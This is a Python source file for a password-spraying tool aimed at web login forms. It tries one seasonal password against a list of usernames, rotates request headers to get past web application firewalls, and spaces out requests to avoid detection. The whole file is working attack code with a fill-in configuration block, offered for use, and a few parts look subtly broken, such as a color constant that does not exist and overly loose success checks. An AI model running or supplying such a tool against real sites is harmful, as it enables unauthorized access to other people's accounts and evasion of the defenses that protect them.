import requests
import random
import string
import time
from urllib.parse import urljoin
from colorama import Fore, init

init(autoreset=True)

class PasswordSprayer:
    """
    Advanced password spraying tool with WAF bypass, success detection, and error handling.
    Features:
    - Randomized headers to bypass WAF
    - Custom success/failure detection
    - Rate limiting and delays
    - Clear output and logging
    """

    def __init__(
        self,
        target_url,
        username_field,
        password_field,
        method="POST",
        login_button=None,
        success_indicators=None,
        failure_indicators=None,
    ):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.method = method.upper()
        self.login_button = login_button
        self.success_indicators = success_indicators or [200, "Welcome", "Dashboard", "Logged in"]
        self.failure_indicators = failure_indicators or [401, "Invalid", "Login failed", "Incorrect"]
        self.session = requests.Session()
        self.session.headers.update(self._generate_random_headers())

    def _generate_random_headers(self):
        """Generate random headers to bypass WAF signatures."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": self.target_url,
        }

    def _random_delay(self, base_delay=2):
        """Random delay between requests to avoid detection."""
        time.sleep(base_delay + random.uniform(0, 1))

    def is_success(self, response):
        """Check if login was successful based on response."""
        # Check HTTP status codes
        if any(str(indicator) == str(response.status_code) for indicator in self.success_indicators if isinstance(indicator, int)):
            return True
        # Check for success strings in response
        if any(indicator in response.text for indicator in self.success_indicators if isinstance(indicator, str)):
            return True
        # Check for absence of failure strings
        if not any(indicator in response.text for indicator in self.failure_indicators if isinstance(indicator, str)):
            return True
        return False

    def spray(
        self,
        password,
        usernames,
        delay=2,
        timeout=10,
        output_file="spray_results.csv",
        max_retries=3,
    ):
        """
        Perform password spraying attack with WAF bypass.
        Returns list of (username, password, status, response_info) tuples.
        """
        results = []
        with open(output_file, "w") as f:
            f.write("Username,Password,Status,HTTP Status,Response Length\n")

            for username in usernames:
                username = username.strip()
                data = {
                    self.username_field: username,
                    self.password_field: password,
                }
                if self.login_button:
                    data[self.login_button] = "submit"

                for attempt in range(max_retries):
                    try:
                        # Randomize headers for each attempt
                        self.session.headers.update(self._generate_random_headers())

                        if self.method == "POST":
                            response = self.session.post(
                                self.target_url,
                                data=data,
                                timeout=timeout,
                                allow_redirects=True,
                            )
                        else:
                            response = self.session.get(
                                self.target_url,
                                params=data,
                                timeout=timeout,
                                allow_redirects=True,
                            )

                        if self.is_success(response):
                            status = "SUCCESS"
                            print(Fore.GREEN + f"[+] Success: {username}:{password} (HTTP {response.status_code})")
                        else:
                            status = "FAILED"
                            print(Fore.RED + f"[-] Failed: {username}:{password} (HTTP {response.status_code})")

                        results.append((
                            username,
                            password,
                            status,
                            response.status_code,
                            len(response.text),
                        ))
                        f.write(f"{username},{password},{status},{response.status_code},{len(response.text)}\n")
                        break  # Success or failure, move to next username

                    except requests.exceptions.RequestException as e:
                        status = f"ERROR: {str(e)}"
                        print(Fore.ORANGE + f"[!] Error for {username}: {str(e)} (Attempt {attempt + 1}/{max_retries})")
                        if attempt == max_retries - 1:
                            results.append((username, password, status, None, None))
                            f.write(f"{username},{password},{status},,\n")
                        time.sleep(delay)  # Wait before retry

                self._random_delay(delay)  # Respectful delay between users

        return results

if __name__ == "__main__":
    # ===== USER CONFIGURATION =====
    TARGET_URL = "https://example.com/login"  # Target login URL
    USERNAME_FIELD = "username"              # Username field name
    PASSWORD_FIELD = "password"              # Password field name
    METHOD = "POST"                          # HTTP method (POST/GET)
    LOGIN_BUTTON = "submit"                 # Login button name (if any)
    SUCCESS_INDICATORS = [200, "Welcome", "Dashboard", "Logged in", "Success"]  # Success markers
    FAILURE_INDICATORS = [401, "Invalid", "Login failed", "Incorrect", "Error"]  # Failure markers
    PASSWORD = "Winter2025"                  # Password to test
    USERNAME_WORDLIST = "usernames.txt"     # Path to username wordlist
    DELAY = 2                               # Base delay between attempts
    OUTPUT_FILE = "spray_results.csv"       # Output file for results
    # ===== END CONFIGURATION =====

    # Load usernames
    with open(USERNAME_WORDLIST, "r") as f:
        usernames = f.readlines()

    # Initialize and run sprayer
    sprayer = PasswordSprayer(
        target_url=TARGET_URL,
        username_field=USERNAME_FIELD,
        password_field=PASSWORD_FIELD,
        method=METHOD,
        login_button=LOGIN_BUTTON,
        success_indicators=SUCCESS_INDICATORS,
        failure_indicators=FAILURE_INDICATORS,
    )
    results = sprayer.spray(PASSWORD, usernames, delay=DELAY, output_file=OUTPUT_FILE)

    # Print summary
    print("\n" + Fore.CYAN + "[Summary]")
    success_count = sum(1 for r in results if r[2] == "SUCCESS")
    print(f"Total attempts: {len(results)} | Successes: {success_count} | Failures: {len(results) - success_count}")
